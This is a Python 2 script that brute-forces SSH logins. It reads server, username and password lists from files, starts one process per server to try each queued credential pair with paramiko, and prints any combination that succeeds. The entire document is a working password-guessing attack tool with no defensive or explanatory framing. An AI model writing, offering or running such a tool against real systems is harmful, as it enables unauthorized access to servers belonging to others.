import multiprocessing
import paramiko
import sys
import time
import Queue


def worker(ip, cred_queue):
    while True:
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            return 

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=creds[0], password=creds[1])
            print 'Success: {0} {1} {2}'.format(ip, creds[0], creds[1])
        except paramiko.AuthenticationException:
            print 'Fail: {0} {1} {2}'.format(ip, creds[0], creds[1])
        except Exception, e:
            print 'Fail: {0} {1}'.format(ip, str(e))
            cred_queue.put(creds)
            return

        time.sleep(.5)

def file_to_list(filename):
    data = []
    for line in open(filename, 'r'):
        line = line.strip()
        if line == '':
            continue
        data.append(line)
    return data

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'Usage: multi_ssh.py server_file username_file password_file'
        sys.exit()

    servers = file_to_list(sys.argv[1])
    usernames = file_to_list(sys.argv[2])
    passwords = file_to_list(sys.argv[3])

    cred_queue = multiprocessing.Queue()
    threads = len(servers)
    procs = []

    for i in range(threads):
        p = multiprocessing.Process(target=worker,
                                    args=(servers[i], cred_queue))
        procs.append(p)
        p.start()

    for user in usernames:
        for pwd in passwords:
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

